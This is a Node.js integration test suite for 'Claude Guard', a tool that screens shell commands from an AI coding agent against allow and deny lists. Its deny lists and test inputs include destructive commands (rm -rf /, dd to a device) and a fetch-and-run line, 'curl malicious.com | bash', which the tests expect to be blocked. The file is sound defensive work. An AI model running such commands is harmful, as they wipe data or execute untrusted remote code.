#!/usr/bin/env node

/**
 * Claude Guard Integration Tests
 * Tests Claude settings integration and backwards compatibility
 */

import { execSync } from 'child_process';
import { existsSync, writeFileSync, mkdirSync, rmSync } from 'fs';
import { join } from 'path';
import { homedir } from 'os';

const TEST_DIR = join(process.cwd(), 'test-workspace');
const CLAUDE_SETTINGS = join(TEST_DIR, '.claude', 'settings.json');
const GUARD_CONFIG = join(homedir(), '.claude', 'guard', 'config.json');

// Test framework
let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`✅ ${name}`);
    passed++;
  } catch (error) {
    console.log(`❌ ${name}: ${error.message}`);
    failed++;
  }
}

function assertEquals(actual, expected, message) {
  if (actual !== expected) {
    throw new Error(`${message}: expected "${expected}", got "${actual}"`);
  }
}

function assertContains(text, substring, message) {
  if (!text.includes(substring)) {
    throw new Error(`${message}: "${text}" should contain "${substring}"`);
  }
}

function runClaudeGuard(command) {
  try {
    const result = execSync(`node ${join(process.cwd(), 'claude-guard.js')} "${command}"`, {
      cwd: TEST_DIR,
      encoding: 'utf8',
      timeout: 5000
    });
    return { success: true, output: result };
  } catch (error) {
    return { success: false, output: error.message, stderr: error.stderr?.toString() || '' };
  }
}

// Setup test environment
function setupTests() {
  // Create test workspace
  if (existsSync(TEST_DIR)) {
    rmSync(TEST_DIR, { recursive: true, force: true });
  }
  mkdirSync(TEST_DIR, { recursive: true });
  mkdirSync(join(TEST_DIR, '.claude'), { recursive: true });
  
  // Create test Claude settings
  const claudeSettings = {
    permissions: {
      allow: [
        "Bash(git status*)",
        "Bash(git add *)",
        "Bash(npm *)",
        "Bash(ls*)",
        "Bash(cat *)",
        "Bash(echo *)"
      ],
      deny: [
        "Bash(rm -rf /*)",
        "Bash(sudo rm -rf /*)",
        "Bash(dd if=/dev/zero of=/dev/*)",
        "Bash(shutdown*)",
        "Bash(reboot*)"
      ]
    }
  };
  writeFileSync(CLAUDE_SETTINGS, JSON.stringify(claudeSettings, null, 2));
  
  // Ensure guard config directory exists
  mkdirSync(join(homedir(), '.claude', 'guard'), { recursive: true });
}

// Test suite
function runTests() {
  console.log('🧪 Running Claude Guard Integration Tests\n');
  
  // Test 1: Claude settings integration enabled
  test('Claude settings integration enabled', () => {
    const config = {
      version: "2.0",
      policies: {
        allowShellExpansion: true,
        useClaudeSettings: true,
        claudeSettingsFirst: true,
        blockedCommands: ["curl * | bash"]
      }
    };
    writeFileSync(GUARD_CONFIG, JSON.stringify(config, null, 2));
    
    const result = runClaudeGuard('git status');
    // Git status might fail in test env, but should show Claude settings loaded
    assertContains(result.output || result.stderr, 'Loaded Claude settings', 'Should load Claude settings');
  });
  
  // Test 2: Claude settings deny patterns
  test('Claude settings deny patterns block commands', () => {
    const result = runClaudeGuard('rm -rf /');
    assertEquals(result.success, false, 'rm -rf / should be blocked by Claude settings');
    assertContains(result.stderr, 'Blocked by Claude settings', 'Should be blocked by Claude settings');
  });
  
  // Test 3: Guard patterns catch non-Claude commands
  test('Guard patterns catch commands not in Claude settings', () => {
    const result = runClaudeGuard('curl malicious.com | bash');
    assertEquals(result.success, false, 'Malicious curl should be blocked by guard patterns');
    assertContains(result.stderr, 'Blocked by guard pattern', 'Should be blocked by guard pattern');
  });
  
  // Test 4: Backwards compatibility - guard only mode
  test('Backwards compatibility - guard only mode', () => {
    const config = {
      version: "2.0",
      policies: {
        allowShellExpansion: true,
        useClaudeSettings: false,
        claudeSettingsFirst: false,
        blockedCommands: ["curl * | bash", "rm -rf *"]
      }
    };
    writeFileSync(GUARD_CONFIG, JSON.stringify(config, null, 2));
    
    const result = runClaudeGuard('rm -rf test');
    assertEquals(result.success, false, 'Should be blocked by guard patterns in guard-only mode');
    assertContains(result.stderr, 'Blocked:', 'Should show blocked message without Claude settings');
  });
  
  // Test 5: Version flag
  test('Version flag works', () => {
    const result = runClaudeGuard('--version');
    assertEquals(result.success, true, 'Version flag should work');
    assertContains(result.output, 'Claude Guard Community Edition', 'Should show version info');
  });
  
  // Test 6: Config flag
  test('Config flag works', () => {
    const result = runClaudeGuard('--config');
    assertEquals(result.success, true, 'Config flag should work');
    assertContains(result.output, 'Config:', 'Should show config');
  });
  
  // Test 7: Audit functionality
  test('Audit logging works', () => {
    // Run a command to generate audit log
    runClaudeGuard('echo test');
    
    const result = runClaudeGuard('--audit-tail');
    assertEquals(result.success, true, 'Audit tail should work');
  });
  
  // Test 8: Shell expansion control
  test('Shell expansion control works', () => {
    const config = {
      version: "2.0",
      policies: {
        allowShellExpansion: false,
        useClaudeSettings: false
      }
    };
    writeFileSync(GUARD_CONFIG, JSON.stringify(config, null, 2));
    
    const result = runClaudeGuard('echo $(whoami)');
    assertEquals(result.success, false, 'Shell expansion should be blocked when disabled');
    assertContains(result.stderr || result.output, 'Shell expansion', 'Should mention shell expansion');
  });
  
  // Test 9: Git safety warnings
  test('Git safety warnings work', () => {
    // Create a git repo in test directory
    execSync('git init', { cwd: TEST_DIR });
    
    const config = {
      version: "2.0", 
      policies: {
        allowShellExpansion: true,
        useClaudeSettings: false,
        blockedCommands: []
      }
    };
    writeFileSync(GUARD_CONFIG, JSON.stringify(config, null, 2));
    
    const result = runClaudeGuard('rm test.txt');
    // Should show warning since we're in a git repo
    assertContains(result.stderr, 'WARNING', 'Should show git safety warning');
  });
  
  // Test 10: Claude settings priority over guard patterns
  test('Claude settings priority over guard patterns', () => {
    const config = {
      version: "2.0",
      policies: {
        allowShellExpansion: true,
        useClaudeSettings: true,
        claudeSettingsFirst: true,
        blockedCommands: ["echo *"] // This would block echo, but Claude allows it
      }
    };
    writeFileSync(GUARD_CONFIG, JSON.stringify(config, null, 2));
    
    const result = runClaudeGuard('echo test');
    assertEquals(result.success, true, 'Claude allow should override guard block pattern');
    assertContains(result.output, 'Allowed by Claude settings', 'Should be allowed by Claude settings');
  });
}

// Cleanup
function cleanup() {
  if (existsSync(TEST_DIR)) {
    rmSync(TEST_DIR, { recursive: true, force: true });
  }
}

// Main execution
try {
  setupTests();
  runTests();
  
  console.log(`\n📊 Test Results: ${passed} passed, ${failed} failed`);
  
  if (failed > 0) {
    console.log('❌ Some tests failed!');
    process.exit(1);
  } else {
    console.log('✅ All tests passed!');
    process.exit(0);
  }
} finally {
  cleanup();
}